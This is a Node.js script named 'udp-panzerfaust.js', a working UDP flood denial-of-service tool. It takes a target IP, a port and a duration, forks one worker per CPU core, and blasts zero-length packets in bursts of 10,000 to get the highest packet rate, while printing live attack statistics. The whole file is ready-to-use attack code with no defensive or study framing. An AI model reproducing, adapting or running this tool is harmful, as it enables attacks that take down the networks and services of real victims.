const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');

const target = process.argv[2];
const port = parseInt(process.argv[3]) || 53;
const duration = parseInt(process.argv[4]);

if (!target || isNaN(duration)) {
  console.log('Usage: node udp-panzerfaust.js <target_ip> <port> <duration_seconds>');
  process.exit(1);
}

const endTime = Date.now() + duration * 1000;
const cpuCount = os.cpus().length;
const payload = Buffer.alloc(0); // zero-length payload for max PPS

if (cluster.isMaster) {
  let totalSent = 0;
  let maxPPS = 0;

  console.clear();
  console.log('UDP-PANZERFAUST v3 [RAW MAX PPS, ZERO PAYLOAD]');
  console.log('----------------------------------------------');
  console.log(`Target: ${target}:${port}`);
  console.log(`Duration: ${duration}s`);
  console.log(`Cores: ${cpuCount}\nStarting...\n`);

  for (let i = 0; i < cpuCount; i++) cluster.fork();

  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.type === 'stats') {
        totalSent += msg.sent;
        if (msg.pps > maxPPS) maxPPS = msg.pps;
      }
    });
  }

  setInterval(() => {
    console.clear();
    console.log('UDP-PANZERFAUST v3 [RAW MAX PPS, ZERO PAYLOAD]');
    console.log('----------------------------------------------');
    console.log(`Total Packets Sent: ${totalSent.toLocaleString()}`);
    console.log(`Max PPS (last 1s): ${maxPPS.toLocaleString()}`);
    console.log(`Target: ${target}:${port}`);
    console.log('----------------------------------------------');
    maxPPS = 0;
  }, 1000);

  setTimeout(() => {
    console.log('\nAttack complete.');
    for (const id in cluster.workers) cluster.workers[id].kill();
    process.exit(0);
  }, duration * 1000);

} else {
  const sock = dgram.createSocket('udp4');
  let sent = 0;
  let pps = 0;

  function spam() {
    if (Date.now() > endTime) return;

    for (let i = 0; i < 10000; i++) { // blast 10k packets per tick
      sock.send(payload, 0, payload.length, port, target, () => {
        sent++;
        pps++;
      });
    }

    setImmediate(spam);
  }

  setInterval(() => {
    process.send({ type: 'stats', sent, pps });
    sent = 0;
    pps = 0;
  }, 1000);

  spam();
}
